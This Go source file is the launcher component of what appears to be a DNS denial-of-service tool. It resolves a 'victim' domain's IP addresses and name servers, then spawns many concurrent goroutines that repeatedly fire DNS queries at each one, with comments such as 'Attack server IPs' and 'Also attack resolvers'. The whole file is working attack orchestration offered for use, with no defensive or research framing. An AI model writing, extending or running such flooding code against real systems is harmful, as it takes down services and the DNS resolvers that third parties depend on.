package internal

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

type Settings struct {
	// Valiables from flags
	NRoutines    *int
	NQuestions   *int
	VictimDomain *string
	SleepTime    *time.Duration
	Deep         *bool
	// Calculated variables
	IPAddresses []net.IP // all known IP adresses of victim
	NameServers []net.IP // all known name servers that resolve victim. only for deep mode
}

type Launcher struct {
	settings *Settings
	stop     chan struct{}
	wg       sync.WaitGroup
}

func NewLauncher(settings *Settings) Launcher {
	return Launcher{
		settings: settings,
		stop:     make(chan struct{}),
	}
}

func (l *Launcher) Initialize() {
	l.initializeIPAddresses()
	l.initializeNameServers()
}

func (l *Launcher) initializeIPAddresses() {
	var err error
	l.settings.IPAddresses, err = net.LookupIP(*l.settings.VictimDomain)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not get IPs: %v\n", err)
		os.Exit(1)
	}
}

func (l *Launcher) initializeNameServers() {
	nameServers, err := net.LookupNS(*l.settings.VictimDomain)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not get name servers: %v\n", err)
		os.Exit(1)
	}
	for _, ns := range nameServers {
		ip, err := net.LookupIP(ns.Host)
		if err != nil {
			fmt.Fprintf(os.Stderr, "could not get IP of name server: %v\n", err)
			os.Exit(1)
		}
		l.settings.NameServers = append(l.settings.NameServers, ip...)
	}
}

func (l *Launcher) Start() {
	// Attack server IPs
	for _, ipAddress := range l.settings.IPAddresses {
		for i := 0; i < *l.settings.NRoutines; i++ {
			l.wg.Add(1)
			go l.runner(ipAddress)
		}
	}
	// Also attack resolvers
	for _, nsAddress := range l.settings.NameServers {
		for i := 0; i < *l.settings.NRoutines; i++ {
			l.wg.Add(1)
			go l.runner(nsAddress)
		}
	}
}

func (l *Launcher) runner(addr net.IP) {
	client := NewDNSClient(net.JoinHostPort(addr.String(), "53"), l.settings)
	senderFunc := client.GetSenderFunc()
	for {
		senderFunc()
		time.Sleep(*l.settings.SleepTime)
		select {
		case _, ok := <-l.stop:
			if !ok {
				l.wg.Done()
				return
			}
		default:
		}
	}
}

func (l *Launcher) AwaitShutdown() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(
		sigChan,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGTERM,
		syscall.SIGQUIT,
	)
	<-sigChan
}

func (l *Launcher) Stop() {
	close(l.stop)
	l.wg.Wait()
}
